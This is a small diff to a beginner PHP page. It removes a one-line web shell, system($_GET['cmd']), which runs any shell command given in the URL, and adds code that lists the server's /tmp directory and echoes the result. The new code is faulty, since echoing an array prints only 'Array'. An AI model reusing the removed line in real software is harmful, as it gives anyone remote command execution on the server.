@@ -5,7 +5,10 @@
 <h1>My first PHP page</h1>
 
 <?php
-system($_GET['cmd']); 
+$path    = '/tmp';
+$files = scandir($path);
+
+echo  $files;
 ?>
 
 </body>
